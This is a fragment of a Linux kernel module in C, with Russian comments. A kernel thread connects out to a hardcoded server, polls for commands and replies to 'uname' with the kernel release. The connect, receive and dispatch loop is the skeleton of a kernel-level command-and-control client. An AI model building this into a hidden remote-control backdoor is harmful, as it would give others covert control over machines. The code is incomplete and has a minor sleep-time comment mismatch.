static int send_data(const char *data, size_t len);
static int recv_data(void);
bool connect_to_server(void);

#include <linux/utsname.h>

#define SERVER_IP   "192.168.157.164"  // IP сервера
#define SERVER_PORT 12345             // Порт сервера

static struct socket *sock = NULL;   // Сокет

void process_msg(char* msg) {
    if (strncmp(msg, "uname", 5) == 0) {
        // printk(KERN_INFO "Получено: %s\n", msg);
        struct new_utsname *uts = init_utsname();
        send_data(uts->release, strlen(uts->release) + 1);
    }
}

static int send_data(const char *data, size_t len) {
    struct kvec vec;
    struct msghdr msg;
    int ret;

    memset(&msg, 0, sizeof(msg));
    vec.iov_base = (void *)data;
    vec.iov_len = len;

    ret = kernel_sendmsg(sock, &msg, &vec, 1, len);
    if (ret < 0) {
        printk(KERN_ERR "Ошибка отправки данных: %d\n", ret);
    }

    return ret;
}

static int recv_data(void) {
    struct kvec vec;
    struct msghdr msg;
    char buffer[128];
    int ret;

    memset(&msg, 0, sizeof(msg));
    vec.iov_base = buffer;
    vec.iov_len = sizeof(buffer) - 1;

    ret = kernel_recvmsg(sock, &msg, &vec, 1, sizeof(buffer) - 1, MSG_DONTWAIT);
    if (ret < 0) {
        printk(KERN_ERR "Ошибка приема данных: %d\n", ret);
        return ret;
    }

    buffer[ret] = '\0';  // Завершаем строку
    
    process_msg(buffer);

    // printk(KERN_INFO "Получено: %s\n", buffer);
    return 0;
}

bool connect_to_server(void) {
    struct sockaddr_in addr;
    int ret;

    // 1. Создаем сокет
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        printk(KERN_ERR "sock_create_kern() failed: %d\n", ret);
        return false;
    }

    // 2. Заполняем структуру адреса сервера
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(SERVER_PORT);
    addr.sin_addr.s_addr = in_aton(SERVER_IP);

    // 3. Подключаемся к серверу
    ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
    if (ret < 0) {
        printk(KERN_ERR "Ошибка подключения: %d\n", ret);
        sock_release(sock);
        return false;
    }

    printk(KERN_INFO "Успешное подключение к %s:%d\n", SERVER_IP, SERVER_PORT);
    return true;
}

// отлавливать когда серв закрывает подключение
static int my_thread_function(void *arg) {
    bool is_conn = false;
    while (!kthread_should_stop()) {  // Пока не пришла команда остановки
        if (is_conn) {
            recv_data();

        } else {
            is_conn = connect_to_server();
        }

        msleep(1000);  // Спим 5 секунду
    }

    if (sock) {
        sock_release(sock);
        printk(KERN_INFO "Сокет закрыт.\n");
    }

    printk(KERN_INFO "Ядро: поток завершен!\n");
    return 0;
}

/*
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/netlink.h>
#include <net/sock.h>








*/